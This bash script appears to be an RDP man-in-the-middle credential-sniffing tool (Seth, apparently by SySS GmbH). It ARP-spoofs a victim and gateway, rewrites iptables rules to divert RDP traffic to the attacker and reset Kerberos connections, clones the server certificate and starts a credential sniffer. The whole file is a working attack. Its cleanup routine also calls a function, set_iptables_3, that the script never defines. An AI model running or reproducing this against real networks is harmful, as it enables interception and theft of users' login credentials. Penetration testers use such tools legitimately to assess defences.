#!/bin/bash

set -e

if [ "$#" -ne 4 ]; then
    cat << EOF
Usage:
$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
EOF
    exit 1
fi

IFACE="$1"
ATTACKER_IP="$2"
VICTIM_IP="$3"
GATEWAY_IP="$4"

IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

set_iptables_1 () {
    local DEL_ADD="$1"
    iptables -"$DEL_ADD" FORWARD -p tcp -s "$VICTIM_IP" \
        --syn --dport 3389  -j REJECT
}

set_iptables_2 () {
    local DEL_ADD="$1"
    iptables -t nat -"$DEL_ADD" PREROUTING -p tcp -d "$ORIGINAL_DEST" \
        -s "$VICTIM_IP" --dport 3389 -j DNAT --to-destination "$ATTACKER_IP"
    iptables -"$DEL_ADD" FORWARD  -p tcp -s "$VICTIM_IP" --dport 88 \
        -j REJECT --reject-with tcp-reset
}

function finish {
    echo "[*] Cleaning up..."
    set +e
    set_iptables_2 D "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST" 2> /dev/null 1>&2
    set_iptables_3 D "$VICTIM_IP" "$ATTACKER_IP" 2> /dev/null 1>&2
    printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
    kill $ARP_PID_1
    kill $ARP_PID_2
    pkill -P $$
    echo "[*] Done."
}
trap finish EXIT

function create_self_signed_cert {
    local CN="$1"
    openssl req -subj "/CN=$CN/O=Seth by SySS GmbH" -new \
        -newkey rsa:2048 -days 365 -nodes -x509 \
        -keyout /tmp/$CN.server.key -out /tmp/$CN.server.crt
    printf "%s\n%s\n" "/tmp/$CN.server.key" "/tmp/$CN.server.crt"
}

echo "[*] Spoofing arp replies..."

arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 &
ARP_PID_1=$!
arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$VICTIM_IP" 2>/dev/null 1>&2 &
ARP_PID_2=$!

echo "[*] Turning on IP forwarding..."

echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Set iptables rules for SYN packets..."

set_iptables_1 A "$VICTIM_IP" 

echo "[*] Waiting for a SYN packet to the original destination..."

ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
    "tcp[tcpflags] ==  tcp-syn" and \
    src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
    | sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/')"

echo "[+] Got it! Original destination is $ORIGINAL_DEST"

echo "[*] Clone the x509 certificate of the original destination..."

CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389" || \
    create_self_signed_cert "$ORIGINAL_DEST")"
KEYPATH="$(printf "%s" "$CERT_KEY" | head -n1)"
CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"

echo "[*] Adjust the iptables rule for all packets..."
set +e
set_iptables_1 D "$VICTIM_IP"
set -e

set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"

echo "[*] Run RDP proxy..."

$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST" 
